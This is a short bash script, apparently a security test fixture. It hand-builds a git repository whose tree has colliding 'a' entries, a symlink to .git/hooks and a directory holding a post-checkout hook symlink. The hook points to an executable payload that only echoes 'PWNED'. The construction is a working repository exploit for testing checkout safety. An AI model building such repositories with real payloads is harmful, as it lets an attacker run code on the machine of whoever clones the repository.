#!/usr/bin/env bash
set -eu -o pipefail

git init -q --initial-branch=main

payload_blob=$(printf '#!/bin/sh\n\necho "PWNED: post-checkout" >&2\n' | git hash-object -w --stdin)
target_dir_blob=$(echo -n .git/hooks | git hash-object -w --stdin)
target_file_blob=$(echo -n ../../payload | git hash-object -w --stdin)

subtree=$(printf '120000 blob %s\tpost-checkout\n' "$target_file_blob" | git mktree)

hex2bin() {
   perl -e 'binmode STDOUT; print pack "H*", $ARGV[0]' "$1"
}

root_tree() {
  printf '120000 a\0'
  hex2bin "$target_dir_blob"

  printf '40000 a\0'
  hex2bin "$subtree"

  printf '100755 payload\0'
  hex2bin "$payload_blob"
}

root_tree=$(root_tree | git hash-object --literally -t tree -w --stdin)
commit=$(git commit-tree "$root_tree" -m 'Initial commit')
git update-ref refs/heads/main "$commit"
git symbolic-ref HEAD refs/heads/main
git rev-parse @^{tree} > head.tree
